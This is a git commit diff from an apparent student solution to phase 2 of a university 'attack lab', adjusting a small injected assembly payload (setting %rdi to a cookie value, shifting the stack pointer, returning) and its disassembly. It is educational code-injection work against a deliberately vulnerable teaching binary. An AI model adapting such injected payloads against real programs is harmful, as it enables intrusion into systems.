101ad8187cbc81a208ff7412882b9c0a6e06ac52
gwy15@WSL <gwy15thu@gmail.com>
2020-07-31 16:07:34 +0800

    attack lab phase 2

--- attack/ctarget.2.d
+++ attack/ctarget.2.d
@@ -6,4 +6,5 @@ Disassembly of section .text:
 
 0000000000000000 <.text>:
    0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
-   7:	c3                   	retq   
+   7:	48 83 ec 10          	sub    $0x10,%rsp
+   b:	c3                   	retq   
--- attack/ctarget.2.s
+++ attack/ctarget.2.s
@@ -1,2 +1,3 @@
 movq $0x59b997fa, %rdi
+subq $0x10, %rsp
 ret
